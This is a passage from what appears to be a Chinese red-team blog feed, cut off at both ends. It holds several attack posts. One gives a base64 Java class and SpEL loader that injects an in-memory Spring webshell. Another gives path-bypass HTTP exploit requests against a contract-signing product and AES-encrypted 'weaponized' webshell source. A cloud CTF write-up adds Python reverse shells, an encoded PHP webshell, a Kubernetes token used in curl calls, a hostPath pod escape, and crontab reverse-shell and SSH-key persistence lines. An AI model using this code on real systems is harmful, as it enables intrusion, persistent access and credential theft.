cHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQubXZjLm1ldGhvZC5hbm5vdGF0aW9uLlJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcMAJcAmAEAPm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQAob3JnL3NwcmluZ2ZyYW1ld29yay9iZWFucy9CZWFuc0V4Y2VwdGlvbgEATm9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQubXZjLmFubm90YXRpb24uRGVmYXVsdEFubm90YXRpb25IYW5kbGVyTWFwcGluZwwAmQCaBwCbDACcAJ0BABNqYXZhL3V0aWwvQXJyYXlMaXN0AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwAngCfDACgAKEHAKIMAKMApAwApQCmAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nBwCnDACoADoBADZ5c29zZXJpYWwucGF5bG9hZHMudGVtcGxhdGVzLlNwcmluZ0ludGVyY2VwdG9yVGVtcGxhdGUMAKkAqgwAqwCLDACsAK0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAGSW5qZXh0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAJbG9hZENsYXNzAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaACEALAANAAAAAAACAAEALQAuAAEALwAAADMAAQABAAAABSq3AAGxAAAAAgAwAAAACgACAAAAMAAEADIAMQAAAAwAAQAAAAUAMgAzAAAACAA0AC4AAQAvAAAC4gAGAAoAAAEOEgJLEgO4AAROLRIFBL0ABlkDEgdTtgAITKcAFToELRIKBL0ABlkDEgtTtgAITCsEtgAMKwEEvQANWQO4AA7AAA+2ABBTtgARwAASOgQSE7gABDoFGQQZBbkAFAIAwAAVTacAGToFEhe4AAQ6BhkEGQa5ABQCAMAAFU0SFRIYtgAZOgUZBQS2ABoZBSy2ABvAABw6BhIdtgAewAAdKrYAHzoHuAAgtgAhOggSIhIjB70ABlkDEiRTWQQSJVNZBbIAJlNZBrIAJlO2AAg6CRkJBLYADBkJGQgHvQANWQMSJ1NZBBkHU1kFA7gAKFNZBhkHvrgAKFO2ABFXGQYZCBIntgAptgAetgAqV6cABE6xAAMACQAZABwACQBNAGEAZAAWAAMBCQEMACsABAAwAAAAagAaAAAAEQADABUACQAXABkAGgAcABgAHgAZAC4AGwAzABwATQAeAFQAHwBhACMAZAAgAGYAIQBtACIAegAkAIMAJQCJACYAlAAnAKIAKACqACkAzQAqANMAKwD5ACwBCQAuAQwALQENAC8AMQAAAKIAEAAZAAMANQA2AAEAHgAQADcAOAAEAFQADQA5ADoABQBhAAMAOwA8AAIAbQANAD0AOgAGAGYAFAA+AD8ABQAJAQAAQAA6AAMATQC8AEEAQgAEAIMAhgBDAEQABQCUAHUARQBGAAYAogBnAEcASAAHAKoAXwBJAEoACADNADwASwA2AAkALgDeADUANgABAHoAkgA7ADwAAgADAQoATABNAAAATgAAACoABABUAA0AOQBPAAUAbQANAD0ATwAGAAkBAABAAE8AAwCUAHUARQBQAAYAUQAAAGIABv8AHAAEBwBSAAAHAFMAAQcAVP8AEQAEBwBSBwBVAAcAUwAA/wA1AAUHAFIHAFUABwBTBwBWAAEHAFf/ABUABQcAUgcAVQcAWAcAUwcAVgAA/wCRAAEHAFIAAQcAWfoAAAABAFoAAAACAFs='\\\\;var bytecode\\\\;try{var clsBase64 = classLoader.loadClass('java.util.Base64')\\\\;var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder')\\\\;var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz)\\\\;bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64)\\\\;} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter')\\\\;bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64)\\\\;} catch (eee) {var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder')\\\\;bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64)\\\\;}}var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader')\\\\;var clsByteArray = (new java.lang.String('a').getBytes().getClass())\\\\;var clsInt = java.lang.Integer.TYPE\\\\;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt])\\\\;defineClass.setAccessible(true)\\\\;var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length))\\\\;clazz.newInstance()\\\\;}$$ 连接方式 路径随意制定： # 每种内存马都同时插入冰蝎，哥斯拉，命令回显内存马 # key为 ck4Gr4Qi # 0.命令回显内存马需要添加http头 Referer:https://www.google.com/ x-client-data:cmd cmd:whoami # 1. 冰蝎需要添加http头,密码为ck4Gr4Qi Referer:https://www.google.com/ x-client-data:rebeyond # 2. 哥斯拉需要添加http头,key为ck4Gr4Qi Referer:https://www.google.com/ x-client-data:godzilla 测试结果如下： ","link":"https://1oecho.github.io/KHsGtk94v/"},{"title":"漏洞利用：某某锁代码执行漏洞实战注入内存马","content":"0x01 漏洞细节 0x01 代码执行 路由：/template/param/edits 0x02 代码执行 2 路由1：/template/html/add 路由2: /template/html/update 0x03 代码执行3 checkParamExistsWhenSend checkWordParamExistsWhenSend 路由： /contract/fillparam 0x02 漏洞利用 前台命令执行 POST /contract/ukeysign/.%2e/.%2e/template/param/edits HTTP/1.1 Host: xxxxx Cookie: SID=3c5dff0a-40d3-4235-b3dc-80a0ede12570 Pragma: no-cache Cache-Control: no-cache Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;113&quot;, &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot; Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Sec-Ch-Ua-Platform: &quot;macOS&quot; Accept: */* Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: script Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Content-Type: application/json Content-Length: 32990 Connection: close {&quot;id&quot;:&quot;2&quot;,&quot;params&quot;:[{&quot;expression&quot;:&quot;var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='classBase64编码';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a.parseExpression(deStr);c.getValue();&quot;}]} 内存马 增加一个 Check-Flag 判断是否注入成功 var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('SpringLogFlag').newInstance();}catch (e){var clsString = classLoader.loadClass('java.lang.String');var bytecodeRaw = 'byteCode';var bytecode = new java.math.BigInteger(bytecodeRaw,36).toByteArray();var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');var clsByteArray = (new java.lang.String('a').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();} 路径：https://xxxxxxx/login/status （有些目标环境没有此路径，执行更换其他路径尝试连接） 前台绕过-命令执行1 POST /contract/ukeysign/.%2e/.%2e/template/html/add HTTP/1.1 Host: xxxxxx Cookie: SID=5ee4f3c3-6494-42db-a97b-ec2c368c6aa4; QID=8b4a2e3d-a057-4a32-be5f-74323c3b535c User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest I18n-Language: zh_CN X-Qid: 8b4a2e3d-a057-4a32-be5f-74323c3b535c Referer: Content-Type: application/json Content-Length: 398 {&quot;title&quot;:&quot;1&quot;, &quot;file&quot;:&quot;1&quot;, &quot;groupId&quot;:&quot;123&quot;, &quot;params&quot;:[{&quot;expression&quot;:&quot;var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='VChqYXZhLmxhbmcuUnVudGltZSkuZ2V0UnVudGltZSgpLmV4ZWMoJ3BpbmcgOTc2ZDExODQuaXB2Ni4xNDMzLmV1Lm9yZycp';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a.parseExpression(deStr);c.getValue();&quot;}] 前台绕过-命令执行2 POST /contract/ukeysign/.%2e/.%2e/template/html/update HTTP/1.1 Host: XXXXXXX User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest I18n-Language: zh_CN Referer: Content-Type: application/json Content-Length: 398 {&quot;title&quot;:&quot;1&quot;, &quot;file&quot;:&quot;1&quot;, &quot;groupId&quot;:&quot;123&quot;, &quot;params&quot;:[{&quot;expression&quot;:&quot;var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='VChqYXZhLmxhbmcuUnVudGltZSkuZ2V0UnVudGltZSgpLmV4ZWMoJ3BpbmcgOTc2ZDExODQuaXB2Ni4xNDMzLmV1Lm9yZycp';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a.parseExpression(deStr);c.getValue();&quot;}] 0x04 武器化实现 spring内存马,按照你的需求修改增加即可 import org.apache.catalina.connector.Request; import org.apache.catalina.connector.RequestFacade; import org.apache.catalina.connector.ResponseFacade; import org.apache.tomcat.util.http.Parameters; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.ServletRequestWrapper; import javax.servlet.ServletResponseWrapper; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.ByteArrayOutputStream; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.math.BigInteger; import java.net.URL; import java.net.URLClassLoader; import java.nio.charset.StandardCharsets; import java.security.MessageDigest; import java.util.*; public class SpringInterHeaderLog extends HandlerInterceptorAdapter { String xc = &quot;8750561e48c1c2a0&quot;; String pass = &quot;pass&quot;; String md5; Class payload; public SpringInterHeaderLog() { this.md5 = md5(this.pass + this.xc); } public static byte[] base64Decode(String bs) throws Exception { byte[] value = null; Class base64; try { base64 = Class.forName(&quot;java.util.Base64&quot;); Object decoder = base64.getMethod(&quot;getDecoder&quot;, (Class[])null).invoke(base64, (Object[])null); value = (byte[])((byte[])decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, bs)); } catch (Exception var6) { try { base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[])((byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, String.class).invoke(decoder, bs)); } catch (Exception var5) { } } return value; } public static String md5(String s) { String ret = null; try { MessageDigest m = MessageDigest.getInstance(&quot;MD5&quot;); m.update(s.getBytes(), 0, s.length()); ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase(); } catch (Exception var3) { } return ret; } public static String base64Encode(byte[] bs) throws Exception { String value = null; Class base64; try { base64 = Class.forName(&quot;java.util.Base64&quot;); Object Encoder = base64.getMethod(&quot;getEncoder&quot;, (Class[])null).invoke(base64, (Object[])null); value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, byte[].class).invoke(Encoder, bs); } catch (Exception var6) { try { base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, byte[].class).invoke(Encoder, bs); } catch (Exception var5) { } } return value; } public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) { try { if (request.getHeader(&quot;check&quot;).equalsIgnoreCase(&quot;true&quot;)) { response.setHeader(&quot;X-XSS-Protection&quot;,&quot;1; mode=block;Live;mode=OK&quot;); } Object lastRequest = request; Object lastResponse = response; Method getResponse; if (!(request instanceof RequestFacade)) { getResponse = ServletRequestWrapper.class.getMethod(&quot;getRequest&quot;); for(lastRequest = getResponse.invoke(request); !(lastRequest instanceof RequestFacade); lastRequest = getResponse.invoke(lastRequest)) { } } if (!(response instanceof ResponseFacade)) { getResponse = ServletResponseWrapper.class.getMethod(&quot;getResponse&quot;); for(lastResponse = getResponse.invoke(response); !(lastResponse instanceof ResponseFacade); lastResponse = getResponse.invoke(lastResponse)) { } } URLClassLoader urlClassLoader; String payload; byte[] data = base64Decode(request.getParameter(this.pass)); data = this.x(data, false); if (this.payload == null) { urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method defMethod = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, Integer.TYPE, Integer.TYPE); defMethod.setAccessible(true); this.payload = (Class)defMethod.invoke(urlClassLoader, data, 0, data.length); } else { ByteArrayOutputStream arrOut = new ByteArrayOutputStream(); Object f = this.payload.newInstance(); f.equals(arrOut); f.equals(data); f.equals(request); response.getWriter().write(this.md5.substring(0, 16)); f.toString(); response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true))); response.getWriter().write(this.md5.substring(16)); } } catch (Exception var20) { return false; } return true; } public byte[] x(byte[] s, boolean m) { try { Cipher c = Cipher.getInstance(&quot;AES&quot;); c.init(m ? 1 : 2, new SecretKeySpec(this.xc.getBytes(), &quot;AES&quot;)); return c.doFinal(s); } catch (Exception var4) { return null; } } } ","link":"https://1oecho.github.io/oYmYrVh51/"},{"title":"云安全: 云安全自建靶场答题记录","content":"题目一 云之影：Shiro的秘密 题目信息： 命令执行 信息收集 云服务 解题步骤（包含关键步骤截图：） 端口扫描： 2.访问8080端口，指纹识别shiro框架，尝试shiro550 反序列化漏洞 存在漏洞，漏洞利用成功，获取webshell： 获取到遗留的配置文件，base64解码： 直接访问显示AccesDenied： 根据提示猜想，可能设置了权限，只有入口主机能访问，尝试访问，访问成功： Flag2 获取成功： 信息收集，查看所有有效用户： 查看ubuntu用户的用户文件夹, 发现db_old文件夹： 发现只有数据库名，没有其他信息： 查看用户的.bash_history 发现敏感操作： Base64解码获取到密码： 尝试登陆,登陆失败，继续查看.bash_history, 发现另一个端口： 登陆成功： 获取flag3: 题目二 云端回响：Spring的遗憾 题目信息： Spring 微服务 SDK 腾讯云 解题步骤（包含关键步骤截图：） 端口扫描： 访问8080端口， 指纹识别名没有信息： 尝试目录扫描 获取到目标存在Spring Actuator 未授权访问漏洞，： 访问路径，发现存在gateway，尝试CVE-2022-22947漏洞 Github搜索关键字获取工具： https://github.com/aodsec/CVE-2022-22947 执行成功： 反弹shell成功： 获取第一个flag： 信息收集，查看ubuntu用户的.bash_history: 执行命令后获取ak和sk： 通过cf利用： 配置ak/sk 选择腾讯云 接管控制台 登陆控制台 查看具体资源，对象存储有资源： 查看cloud-2-flag2对象存储获取flag2: 查看cloud-3-flag3对象存储获取flag3 题目三 云端之影：Docker的双重背叛 题目信息： Docker 文件管理 逃逸 解题步骤（包含关键步骤截图：） 端口扫描： 访问80端口： 尝试下主页功能，都是无效功能，目录扫描： 存在upload.php，访问尝试, 上传php webshell： 冰蝎链接成功，获取Flag1： 信息收集发现发现，当前环境为docker环境无k8s集群： CDK信息收集 存在docker.sock 挂载： 反弹shell 手工利用 挂载宿主机根目录。获取宿主机权限，获取flag2： Docker ps 查看所有容器，发现flag-container-image 镜像的Docker 直接进入对应Docker，获取Flag3 题目四 云端之谜：Docker的隐藏秘密 题目信息： python后门Docker 逃逸 解题步骤（包含关键步骤截图：） 端口扫描： 访问8080端口： 查看页面源代码： 通过路由获取系统备份： 代码审计发现，系统存在命令执行后门： 列目录获取flag1: 信息收集，当前环境为单docker，无k8s集群： Python环境不能写webshell，我们直接将CDK下载进去： 收集docker信息 发现存在特权，直接利用特权进行逃逸： 手工确认： 反弹一个shell来深入利用 python3 -c 'import os,pty,socket;s=socket.socket();s.connect((&quot;xxxxxxx&quot;,9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)' 挂载宿主机硬盘到docker里 mkdir /tmp/mnt mount /dev/sda1 /tmp/mnt cd /tmp/mnt 查看宿主根目录，获取flag2 因为我们已经获取了宿主机的硬盘权限，直接搜索flag3关键字，即可从宿主机文件系统，读到另一个docker的文件 题目五 云端迷宫：Kubernetes之旅 题目信息: RCE K8s ServiceAccount 解题步骤（包含关键步骤截图：） 直接访问： http://ngrok.xiaomiqiu123.top:43248/ 手工测试后，发现是一个无显的命令执行漏洞： 随意输入命令，报错获取到绝对路径，可以直接写入webshell： 直接echo 写入一个冰蝎马： echo PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKCWZ1bmN0aW9uIERlY3J5cHQoJGRhdGEpCnsKICAgICRrZXk9ImU0NWUzMjlmZWI1ZDkyNWIiOyAKICAgICRicz0iYmFzZTY0XyIuImRlY29kZSI7CgkkYWZ0ZXI9JGJzKCRkYXRhLiIiKTsKCWZvcigkaT0wOyRpPHN0cmxlbigkYWZ0ZXIpOyRpKyspIHsKICAgIAkkYWZ0ZXJbJGldID0gJGFmdGVyWyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIH0KICAgIHJldHVybiAkYWZ0ZXI7Cn0KCSRwb3N0PURlY3J5cHQoZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0IikpOwogICAgZXZhbCgkcG9zdCk7Cj8+ | base64 -d &gt; /var/www/html/oooooo.php 连接成功： 搜索flag1: 信息收集, 发现我们目前处于一个k8s的pod当中: cat /proc/1/cgroup 查看env信息 我们查看当前pod的服务账户Token: eyJhbGciOiJSUzI1NiIsImtpZCI6InNUSExVVHNuaVBocTN5eU1mWEtlbTdNRUlzLVRhblM5dDhiZmJuSlJ1d1EifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5MTA2NjAxLCJpYXQiOjE2OTc1NzA2MDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJ3ZWItYXBwLTc3ZmJmNjU3NmItcDR3eGQiLCJ1aWQiOiJlODZiM2I4Zi1iNzlmLTRjMDctODBjZS01Zjk2MmYwOTE0MmQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndlYi1hcHAtc2EiLCJ1aWQiOiJlM2JiOGI4MC02NDk5LTQ1MWItOGZmYi1kNDczMzc0NGQ2MGYifSwid2FybmFmdGVyIjoxNjk3NTc0MjA4fSwibmJmIjoxNjk3NTcwNjAxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDp3ZWItYXBwLXNhIn0.WtbuPrZpCvttzmBY8BJXzThzBtivxf8GboxNYwpPsMN0XYF5EtA1aGs1hWAWI4zupeV5z-XZWOeulDrkXIB6e1qiMVFvdAZXH6S0O79GlIOd9PwPNgPHDmn3d0Lm1zNFjJN6RVHI50ZvFfZt3W0YuGGnPfEjbX536TWA0DrARV94q976-PtwObjuW-Ef03KRNwTsKCU7x6CoviVidNefwlGmw0w8rkO96dJJqLp97rScy615XkaUrSuT0iHnjXy4iBrXZINcJxSt4SpgKdIdli749YjzN3ivU-iGdbsi6q5S6tehGqAvHJUSdqNOerNhcL0T1eGHcaxBmwAFevzYcA 先获取Service相关信息： 我们通过获取到的token 列一下pod：发现存在utility-pod curl -s -k -H &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InNUSExVVHNuaVBocTN5eU1mWEtlbTdNRUlzLVRhblM5dDhiZmJuSlJ1d1EifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5MTA2NjAxLCJpYXQiOjE2OTc1NzA2MDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJ3ZWItYXBwLTc3ZmJmNjU3NmItcDR3eGQiLCJ1aWQiOiJlODZiM2I4Zi1iNzlmLTRjMDctODBjZS01Zjk2MmYwOTE0MmQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndlYi1hcHAtc2EiLCJ1aWQiOiJlM2JiOGI4MC02NDk5LTQ1MWItOGZmYi1kNDczMzc0NGQ2MGYifSwid2FybmFmdGVyIjoxNjk3NTc0MjA4fSwibmJmIjoxNjk3NTcwNjAxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDp3ZWItYXBwLXNhIn0.WtbuPrZpCvttzmBY8BJXzThzBtivxf8GboxNYwpPsMN0XYF5EtA1aGs1hWAWI4zupeV5z-XZWOeulDrkXIB6e1qiMVFvdAZXH6S0O79GlIOd9PwPNgPHDmn3d0Lm1zNFjJN6RVHI50ZvFfZt3W0YuGGnPfEjbX536TWA0DrARV94q976-PtwObjuW-Ef03KRNwTsKCU7x6CoviVidNefwlGmw0w8rkO96dJJqLp97rScy615XkaUrSuT0iHnjXy4iBrXZINcJxSt4SpgKdIdli749YjzN3ivU-iGdbsi6q5S6tehGqAvHJUSdqNOerNhcL0T1eGHcaxBmwAFevzYcA&quot; https://10.96.0.1/api/v1/namespaces/default/pods 查看下这个pod的详细信息,发现信息： curl -s -k -H &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InNUSExVVHNuaVBocTN5eU1mWEtlbTdNRUlzLVRhblM5dDhiZmJuSlJ1d1EifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5MTA2NjAxLCJpYXQiOjE2OTc1NzA2MDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJ3ZWItYXBwLTc3ZmJmNjU3NmItcDR3eGQiLCJ1aWQiOiJlODZiM2I4Zi1iNzlmLTRjMDctODBjZS01Zjk2MmYwOTE0MmQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndlYi1hcHAtc2EiLCJ1aWQiOiJlM2JiOGI4MC02NDk5LTQ1MWItOGZmYi1kNDczMzc0NGQ2MGYifSwid2FybmFmdGVyIjoxNjk3NTc0MjA4fSwibmJmIjoxNjk3NTcwNjAxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDp3ZWItYXBwLXNhIn0.WtbuPrZpCvttzmBY8BJXzThzBtivxf8GboxNYwpPsMN0XYF5EtA1aGs1hWAWI4zupeV5z-XZWOeulDrkXIB6e1qiMVFvdAZXH6S0O79GlIOd9PwPNgPHDmn3d0Lm1zNFjJN6RVHI50ZvFfZt3W0YuGGnPfEjbX536TWA0DrARV94q976-PtwObjuW-Ef03KRNwTsKCU7x6CoviVidNefwlGmw0w8rkO96dJJqLp97rScy615XkaUrSuT0iHnjXy4iBrXZINcJxSt4SpgKdIdli749YjzN3ivU-iGdbsi6q5S6tehGqAvHJUSdqNOerNhcL0T1eGHcaxBmwAFevzYcA&quot; https://10.96.0.1/api/v1/namespaces/default/pods/utility-pod-7bf9988594-x9ls4 Flag2 和Flag3 都在这个pod里，所以我们的目的就是横向到这个pod 下载kubectl到pod中,直接指定信息操作 通过命令指定token以及对应的api的地址,进行远程操控pod.横向到目标pod即可: 查看POD kubectl get pods --server=https://&lt;api-server-url&gt; --token=&lt;Service Account Token&gt; 操作POD: kubectl exec -it utility-pod bash --server=https://&lt;api-server-url&gt; --token=&lt;Service Account Token&gt; 后续可以继续利用,权限足够的话: 创建特权pod 挂载实体机/ 到 特权pod的 /mnt kubectl apply -f app.yaml --server=https://&lt;api-server-url&gt; --token=&lt;Service Account Token&gt; app.yaml apiVersion: v1 kind: Pod metadata: name: app spec: containers: - image: nginx name: test-container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / 进入我们创建的特权token 进/mnt 目录 kubectl exec -it app /bin/bash --server=https:// --token= 后渗透: // 1. 向 crontab 写入反弹 shell 的定时任务 # echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/x.x.x.x/8888 0&gt;&amp;1n&quot; &gt;&gt; /mnt/etc/crontab // 2. 写入SSH公钥直接连接： echo &quot;ssh-rsa 123&quot; &gt;&gt; /mnt/root/.ssh/authorized_keys 题目六 环环相扣 题目信息： 某个应用的备份文件存在泄漏，泄漏在了COS上，已知信息如下： 服务商: 腾讯云 前缀: backupdata-1318326636 位置：ap-shanghai 文件名：app-pom.xml Xstream RCE Docker 解题步骤（包含关键步骤截图：） 通过题目的提示我们能猜出目标的COS地址： https://backupdata-1318326636.cos.ap-shanghai.myqcloud.com/ 根据提示构造下文件名,获取到文件内容，注释包含一个IP，看文件接口是java系统的Mvn的pom.xml文件： 从配置文件获取的 依赖有springBoot以及Xstream 端口扫描下注释里的IP地址： 访问端口8080： 随便构造一个xml 爆500 猜测可能直接是通过Content-Type来直接解析xml： 再搜索下xstream 1.4.15 存在哪些漏洞，获取的信息如下： 符合版本的漏洞如下： | XStream 远程代码执行漏洞 | CVE-2021-21344 | XStream: &lt;= 1.4.15 | | ------------------------ | ------------------------------------------------------------ | -------------------- | | XStream 远程代码执行漏洞 | CVE-2021-21345 | XStream: &lt;= 1.4.15 | | XStream 远程代码执行漏洞 | CVE-2021-21346 | XStream: &lt;= 1.4.15 | | XStream 远程代码执行漏洞 | CVE-2021-21347 | XStream&lt;= 1.4.15 | | XStream 远程代码执行漏洞 | CVE-2021-21350 | XStream: &lt;= 1.4.15 | | XStream 远程代码执行漏洞 | CVE-2021-21351 | XStream: &lt;= 1.4.15 | | XStream 远程代码执行漏洞 | CVE-2021-29505 | XStream: &lt;= 1.4.16 | 我们尝试了几个，发现CVE-2021-21351 可以利用, 打JNDI 利用链使用spring依赖的 通过python3来反弹shell： python3 -c 'import os,pty,socket;s=socket.socket();s.connect((&quot;xxxxxx&quot;,9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)' 反弹成功，获取第二个flag 信息收集 本机docker有Flag3： 进入docker获取flag3: ","link":"https://1oecho.github.io/2EzGQuE0b/"},{"title":"红队开发: Behinder3-Beta11 实战下的二次开发 （4）","content":"0x00 实战问题 猜测微步流量检测的实现原理 需要解决的问题： 请求体的数据传递方式 需要对webshell进行修改，为适配不做修改 